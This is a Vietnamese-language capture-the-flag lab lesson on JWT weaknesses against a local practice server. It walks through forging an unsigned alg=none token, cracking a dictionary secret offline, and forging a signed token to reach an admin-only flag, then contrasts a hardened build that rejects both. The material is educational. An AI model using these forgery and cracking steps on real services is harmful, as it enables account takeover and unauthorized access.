# Bài 11 · JWT — token không chữ ký và khoá bí mật trong từ điển (LAB-11)

**Mục tiêu:** hiểu JWT là gì, vì sao `alg=none` + secret yếu là thảm hoạ, và
tự forge được một token hợp lệ — bài học xác thực API kinh điển nhất hiện nay.

Lab vuln: `http://127.0.0.1:3000` · hardened: `:3001`.
Tài khoản: `alice/alice123` (admin), `bob/bob45678`.

## 1. Cấu trúc JWT — 30 giây

```
header.payload.signature   — mỗi phần chỉ là base64url(JSON)
```

JWT **không mã hoá** — ai cũng đọc được payload. Chữ ký chỉ chứng minh
"payload này do server ký, chưa bị sửa".

## 2. Lấy token thật và mổ xẻ

```bash
curl -s -X POST http://127.0.0.1:3000/api/token -d "username=alice&password=alice123"
# → {"token":"eyJ..."}

node src/cli.js jwt decode <token>
# header: {"alg":"HS256","typ":"JWT"}   payload: {"sub":"alice","role":"admin",...}
```

Dùng token hợp lệ:

```bash
curl "http://127.0.0.1:3000/api/profile?token=<token>"   # → profile của alice
```

## 3. Tấn công A — alg=none

Bản vuln `jwtVerify(token, secret, { allowNone: true })` — chấp nhận token
**không chữ ký**. Forge một token cho service account nội bộ `ctfsvc`:

```bash
node src/cli.js jwt forge --payload='{"sub":"ctfsvc","role":"svc"}' --alg=none
curl "http://127.0.0.1:3000/api/profile?token=<token-vua-forge>"
# → flag CTF #6 (ctfsvc không thể login — chỉ đến được bằng forge)
```

## 4. Tấn công B — crack secret yếu

Secret của lab vuln là `secret123` — nằm trong từ điển. Chữ ký HS256 chỉ là
`HMAC-SHA256(secret, header.payload)` → attacker tải token về và thử từng
secret **offline**, không cần gọi server:

```bash
node src/cli.js jwt crack <token-cua-alice>
# ✔ TÌM THẤY secret: secret123

node src/cli.js jwt forge --payload='{"sub":"ctfsvc"}' --secret=secret123
curl "http://127.0.0.1:3000/api/profile?token=<forged>"   # → flag lần nữa
```

## 5. Đối chứng bản đã vá

Bản hardened: khoá ngẫu nhiên 256-bit theo phiên + `allowNone:false` +
kiểm `exp`. Cả hai tấn công trên đều → `401 invalid_token`.

## ✅ Hoàn thành khi

- [ ] Decode được token và đọc payload
- [ ] Forge alg=none lấy được cờ CTF #6 (`challenge --submit=6`)
- [ ] Crack được `secret123` và forge token HS256 hợp lệ
- [ ] Trả lời: vì sao crack HS256 nhanh đến vậy (gợi ý: HMAC rất nhanh, và
      attacker verify offline — không bị rate-limit)?
